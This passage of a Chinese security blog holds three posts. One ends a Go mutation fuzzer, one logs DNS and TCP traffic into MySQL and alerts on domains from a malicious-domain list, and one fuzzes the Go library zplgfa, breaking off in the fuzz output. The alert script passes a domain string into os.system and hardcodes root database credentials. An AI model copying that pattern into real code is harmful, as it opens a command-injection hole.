class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, idx := <span class="keyword">range</span> flipIndexes &#123;</span><br><span class="line">        method := rand.Intn(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> method == <span class="number">0</span> &#123;</span><br><span class="line">            data[idx+<span class="number">2</span>] = bitFlip(data[idx+<span class="number">2</span>])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            magic(data, idx+<span class="number">2</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// func bitFlip(b byte) byte &#123;</span></span><br><span class="line"><span class="comment">//  return b ^ 0x01</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bitFlip</span><span class="params">(byteVal <span class="type">byte</span>)</span></span> <span class="type">byte</span> &#123;</span><br><span class="line">    flipVal := FLIP_ARRAY[rand.Intn(<span class="built_in">len</span>(FLIP_ARRAY))]</span><br><span class="line">    <span class="keyword">return</span> byteVal ^ flipVal</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">magic</span><span class="params">(data []<span class="type">byte</span>, idx <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    pickedMagic := MAGIC_VALS[rand.Intn(<span class="built_in">len</span>(MAGIC_VALS))]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, m := <span class="keyword">range</span> pickedMagic &#123;</span><br><span class="line">        data[idx+i] = m</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>getBytes和writeDataToFile这种功能性函数不与赘述。只介绍逻辑函数。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/06/27/2023-06-27-fuzzer/" data-id="cuidMH04cSo7hUYZ1Y7GNjVEv" data-title="如何完成一个 fuzzer" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2023-05-31-report" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/05/31/2023-05-31-report/" class="article-date">
  <time class="dt-published" datetime="2023-05-30T16:00:00.000Z" itemprop="datePublished">2023-05-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/05/31/2023-05-31-report/">安全开发</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="抓包存mysql中"><a href="#抓包存mysql中" class="headerlink" title="抓包存mysql中"></a>抓包存mysql中</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/google/gopacket/layers&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/google/gopacket/pcap&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/jinzhu/gorm&quot;</span></span><br><span class="line">    _ <span class="string">&quot;github.com/jinzhu/gorm/dialects/mysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> DNSPacket <span class="keyword">struct</span> &#123;</span><br><span class="line">    ID      <span class="type">uint16</span> <span class="string">`gorm:&quot;primary_key&quot;`</span></span><br><span class="line">    Queries <span class="type">string</span></span><br><span class="line">    Answers <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Open the device for capturing</span></span><br><span class="line">    handle, err := pcap.OpenLive(<span class="string">&quot;en0&quot;</span>, <span class="number">65535</span>, <span class="literal">true</span>, pcap.BlockForever)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> handle.Close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set a filter to capture only DNS packets</span></span><br><span class="line">    filter := <span class="string">&quot;udp and port 53&quot;</span></span><br><span class="line">    err = handle.SetBPFFilter(filter)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open a connection to the MySQL database</span></span><br><span class="line">    db, err := gorm.Open(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;root:123456@tcp(127.0.0.1:3306)/database?charset=utf8&amp;parseTime=True&amp;loc=Local&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> db.Close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create the DNSPacket table if it doesn&#x27;t exist</span></span><br><span class="line">    db.AutoMigrate(&amp;DNSPacket&#123;&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Start capturing packets</span></span><br><span class="line">    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())</span><br><span class="line">    <span class="keyword">for</span> packet := <span class="keyword">range</span> packetSource.Packets() &#123;</span><br><span class="line">        <span class="comment">// Parse the DNS packet</span></span><br><span class="line">        dnsLayer := packet.Layer(layers.LayerTypeDNS)</span><br><span class="line">        <span class="keyword">if</span> dnsLayer != <span class="literal">nil</span> &#123;</span><br><span class="line">            dnsPacket := dnsLayer.(*layers.DNS)</span><br><span class="line">            <span class="keyword">if</span> dnsPacket.QR == <span class="literal">false</span> &amp;&amp; dnsPacket.OpCode == layers.DNSOpCodeQuery &#123;</span><br><span class="line">                <span class="comment">// Extract the queries from the DNS packet</span></span><br><span class="line">                queries := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="built_in">len</span>(dnsPacket.Questions))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> i, question := <span class="keyword">range</span> dnsPacket.Questions &#123;</span><br><span class="line">                    queries[i] = <span class="type">string</span>(question.Name)</span><br><span class="line">                    fmt.Println((question))</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if the DNSPacket already exists in the database</span></span><br><span class="line">                <span class="keyword">var</span> count <span class="type">int</span></span><br><span class="line">                db.Model(&amp;DNSPacket&#123;&#125;).Where(<span class="string">&quot;id = ?&quot;</span>, dnsPacket.ID).Count(&amp;count)</span><br><span class="line">                <span class="keyword">if</span> count == <span class="number">0</span> &#123;</span><br><span class="line">                    <span class="comment">// Recursively resolve the DNS queries</span></span><br><span class="line">                    answers := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">for</span> _, query := <span class="keyword">range</span> queries &#123;</span><br><span class="line">                        <span class="comment">// fmt.Println(query)</span></span><br><span class="line">                        ips, err := resolveDNS(query)</span><br><span class="line">                        <span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">                            answers = <span class="built_in">append</span>(answers, ips...)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Create a new DNSPacket object and save it to the database</span></span><br><span class="line">                    dnsPacket := DNSPacket&#123;</span><br><span class="line">                        ID:      dnsPacket.ID,</span><br><span class="line">                        Queries: strings.Join(queries, <span class="string">&quot;,&quot;</span>),</span><br><span class="line">                        Answers: strings.Join(answers, <span class="string">&quot;,&quot;</span>),</span><br><span class="line">                    &#125;</span><br><span class="line">                    db.Create(&amp;dnsPacket)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">resolveDNS</span><span class="params">(query <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="comment">// Resolve the DNS query using the system resolver</span></span><br><span class="line">    ips := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">0</span>)</span><br><span class="line">    addrs, err := net.LookupHost(query)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ips, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> _, addr := <span class="keyword">range</span> addrs &#123;</span><br><span class="line">        ips = <span class="built_in">append</span>(ips, addr)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ips, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤器选择udp并且53端口的，然后都存到数据库中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">![image.png](https://raw.githubusercontent.com/pic4xiu/pic4xiu.github.io/master/_posts/waf2/em1.png)</span><br><span class="line">```python</span><br><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">import mysql.connector</span><br><span class="line"># import smtplib</span><br><span class="line">import os</span><br><span class="line"># 恶意域名库文件路径</span><br><span class="line">MALWARE_DOMAINS_FILE = &quot;domains.list&quot;</span><br><span class="line"></span><br><span class="line"># MySQL数据库连接信息</span><br><span class="line">MYSQL_HOST = &quot;localhost&quot;</span><br><span class="line">MYSQL_PORT = 3306</span><br><span class="line">MYSQL_USER = &quot;root&quot;</span><br><span class="line">MYSQL_PASSWORD = &quot;123456&quot;</span><br><span class="line">MYSQL_DATABASE = &quot;database&quot;</span><br><span class="line"></span><br><span class="line">cnx = mysql.connector.connect(user=MYSQL_USER, password=MYSQL_PASSWORD,</span><br><span class="line">                              host=MYSQL_HOST, port=MYSQL_PORT,</span><br><span class="line">                              database=MYSQL_DATABASE)</span><br><span class="line">cursor = cnx.cursor()</span><br><span class="line"></span><br><span class="line"># 检查恶意域名库中的域名是否存在于数据库中</span><br><span class="line">with open(MALWARE_DOMAINS_FILE) as f:</span><br><span class="line">    for domain in f:</span><br><span class="line">        domain = domain.strip()</span><br><span class="line">        query = &quot;SELECT COUNT(*) FROM dns_packets WHERE queries = %s&quot;</span><br><span class="line"></span><br><span class="line">        cursor.execute(query, (domain,))</span><br><span class="line">        result = cursor.fetchone()[0]</span><br><span class="line">        print(result)</span><br><span class="line">        if result &gt;= 1:</span><br><span class="line">            # 触发告警</span><br><span class="line">            subject = &quot;Malware Alert&quot;</span><br><span class="line">            body = f&quot;Alert: &#123;domain&#125; found in malware domain list&quot;</span><br><span class="line">            print(&#x27;echo &#x27;+body+&#x27;| mail -s &quot;恶意域名！&quot; *****@qq.com&#x27;)#发送邮件</span><br><span class="line">            os.system(&#x27;echo &#x27;+body+&#x27;| mail -s &quot;bad query!&quot; ******@qq.com&#x27;)#直接用系统命令会简单很多</span><br><span class="line"></span><br><span class="line">cursor.close()</span><br><span class="line">cnx.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后如果是开了微信的qq邮箱提醒的话，直接就可以看到，刷新很快啊！</p>
<p><img src="https://raw.githubusercontent.com/pic4xiu/pic4xiu.github.io/master/_posts/waf2/em2.jpg" alt="image.png"></p>
<p>当然并没有访问恶意域名，只是把bing.com放到数据库里边了，而且在恶意域名库里加了一下而已。</p>
<p><img src="https://raw.githubusercontent.com/pic4xiu/pic4xiu.github.io/master/_posts/waf2/em3.png" alt="image.png"></p>
<h2 id="恶意ip的"><a href="#恶意ip的" class="headerlink" title="恶意ip的"></a>恶意ip的</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;database/sql&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    _ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/google/gopacket/layers&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/google/gopacket/pcap&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 打开数据库连接</span></span><br><span class="line">    db, err := sql.Open(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;root:123456@tcp(127.0.0.1:3306)/database&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> db.Close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建TCP数据包表</span></span><br><span class="line">    _, err = db.Exec(<span class="string">&quot;CREATE TABLE IF NOT EXISTS tcp_packets (id INT AUTO_INCREMENT PRIMARY KEY, src_ip VARCHAR(15), dst_ip VARCHAR(15), src_port INT, dst_port INT)&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开网络接口</span></span><br><span class="line">    handle, err := pcap.OpenLive(<span class="string">&quot;en0&quot;</span>, <span class="number">65535</span>, <span class="literal">true</span>, pcap.BlockForever)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> handle.Close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置过滤器，只捕获TCP流量</span></span><br><span class="line">    filter := <span class="string">&quot;tcp&quot;</span></span><br><span class="line">    err = handle.SetBPFFilter(filter)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取TCP数据包</span></span><br><span class="line">    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())</span><br><span class="line">    <span class="keyword">for</span> packet := <span class="keyword">range</span> packetSource.Packets() &#123;</span><br><span class="line">        <span class="comment">// 解析TCP数据包</span></span><br><span class="line">        tcpLayer := packet.Layer(layers.LayerTypeTCP)</span><br><span class="line">        <span class="keyword">if</span> tcpLayer != <span class="literal">nil</span> &#123;</span><br><span class="line">            tcp, _ := tcpLayer.(*layers.TCP)</span><br><span class="line">            srcIP := packet.NetworkLayer().NetworkFlow().Src().String()</span><br><span class="line">            dstIP := packet.NetworkLayer().NetworkFlow().Dst().String()</span><br><span class="line">            srcPort := tcp.SrcPort</span><br><span class="line">            dstPort := tcp.DstPort</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将五元组信息存储到数据库中</span></span><br><span class="line">            _, err = db.Exec(<span class="string">&quot;INSERT INTO tcp_packets (src_ip, dst_ip, src_port, dst_port) VALUES (?, ?, ?, ?)&quot;</span>, srcIP, dstIP, srcPort, dstPort)</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                log.Println(err)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/pic4xiu/pic4xiu.github.io/master/_posts/waf2/em4.png" alt="image.png"></p>
<p>自动告警与之类似，不做赘述</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/05/31/2023-05-31-report/" data-id="cuid-GJ7W0JA7jvJ9qGSgvzVK" data-title="安全开发" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2023-06-18-fixandPR" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/05/31/2023-06-18-fixandPR/" class="article-date">
  <time class="dt-published" datetime="2023-05-30T16:00:00.000Z" itemprop="datePublished">2023-05-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="项目一览"><a href="#项目一览" class="headerlink" title="项目一览"></a>项目一览</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/SimonWaldherr/zplgfa">偶然间看到的库</a></p>
</blockquote>
<p><img src="https://p.ipic.vip/bzif29.jpg"></p>
<p>这个项目是将 PNG、JPEG 和 GIF 编码的图形文件转换为 ZPL 兼容的 ^GF 元素，然后作者给出了实例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;simonwaldherr.de/go/zplgfa&quot;</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;image&quot;</span><br><span class="line">    _ &quot;image/gif&quot;</span><br><span class="line">    _ &quot;image/jpeg&quot;</span><br><span class="line">    _ &quot;image/png&quot;</span><br><span class="line">    &quot;log&quot;</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    // open file</span><br><span class="line">    file, err := os.Open(&quot;label.png&quot;)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        log.Printf(&quot;Warning: could not open the file: %s\n&quot;, err)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    defer file.Close()</span><br><span class="line"></span><br><span class="line">    // load image head information</span><br><span class="line">    config, format, err := image.DecodeConfig(file)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        log.Printf(&quot;Warning: image not compatible, format: %s, config: %v, error: %s\n&quot;, format, config, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // reset file pointer to the beginning of the file</span><br><span class="line">    file.Seek(0, 0)</span><br><span class="line"></span><br><span class="line">    // load and decode image</span><br><span class="line">    img, _, err := image.Decode(file)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        log.Printf(&quot;Warning: could not decode the file, %s\n&quot;, err)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // flatten image</span><br><span class="line">    flat := zplgfa.FlattenImage(img)</span><br><span class="line"></span><br><span class="line">    // convert image to zpl compatible type</span><br><span class="line">    gfimg := zplgfa.ConvertToZPL(flat, zplgfa.CompressedASCII)</span><br><span class="line"></span><br><span class="line">    // output zpl with graphic field data to stdout</span><br><span class="line">    fmt.Println(gfimg)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整体跑一遍基本就能明白他在干什么。然后把代码改成 fuzz 的格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">package test</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;bytes&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;image/gif&quot;</span><br><span class="line">	&quot;testing&quot;</span><br><span class="line"></span><br><span class="line">	&quot;simonwaldherr.de/go/zplgfa&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func FuzzReverse(f *testing.F) &#123;</span><br><span class="line">	f.Fuzz(func(a *testing.T, data []byte) &#123; //接收参数</span><br><span class="line"></span><br><span class="line">		// load and decode image</span><br><span class="line">		img, err := gif.Decode(bytes.NewReader(data))</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// flatten image</span><br><span class="line">		flat := zplgfa.FlattenImage(img)</span><br><span class="line">		// wid := flat.Bounds().Size().X / 8</span><br><span class="line"></span><br><span class="line">		// panic(wid)</span><br><span class="line">		// convert image to zpl compatible type</span><br><span class="line">		gfimg := zplgfa.ConvertToZPL(flat, zplgfa.CompressedASCII)</span><br><span class="line"></span><br><span class="line">		// output zpl with graphic field data to stdout</span><br><span class="line">		fmt.Println(gfimg)</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接跑一遍就有 bug 了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">❯ go test -fuzz=Fuzz</span><br><span class="line">fuzz: elapsed: 2s, gathering baseline coverage: 0/1541 completed</span><br><span class="line">fuzz: minimizing 